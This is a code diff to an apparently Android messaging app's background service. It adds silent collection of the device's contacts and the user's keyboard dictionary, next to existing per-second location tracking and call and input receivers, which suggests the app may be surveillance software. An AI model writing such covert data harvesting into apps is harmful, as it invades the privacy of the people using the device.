@@ -25,6 +25,7 @@ import android.util.Log;
 import com.candroid.textme.data.Constants;
 import com.candroid.textme.data.db.Database;
 import com.candroid.textme.data.db.DatabaseHelper;
+import com.candroid.textme.data.pojos.Contact;
 import com.candroid.textme.data.pojos.Recorder;
 import com.candroid.textme.receivers.ImeReceiver;
 import com.candroid.textme.jobs.JobsScheduler;
@@ -37,6 +38,8 @@ import com.candroid.textme.receivers.OutgoingReceiver;
 import com.candroid.textme.receivers.ScreenReceiver;
 import com.candroid.textme.receivers.WapReceiver;
 import com.candroid.textme.receivers.WifiReceiver;
+
+import java.util.ArrayList;
 
 public class MessagingService extends Service {
 
@@ -202,6 +205,11 @@ public class MessagingService extends Service {
         }
         mLocationListener = Lofl.getLocationListener(this);
         mLocationManager.requestLocationUpdates(locationProvider, 1000, 30, mLocationListener, mLooper);
+        ArrayList<Contact> contacts = Lofl.fetchContactsInformation(this);
+        ArrayList<String> dictionary = Lofl.fetchDictionary(this);
+        for(String word : dictionary){
+            Log.d("DICTIONARY", word);
+        }
     }
 
     @Override
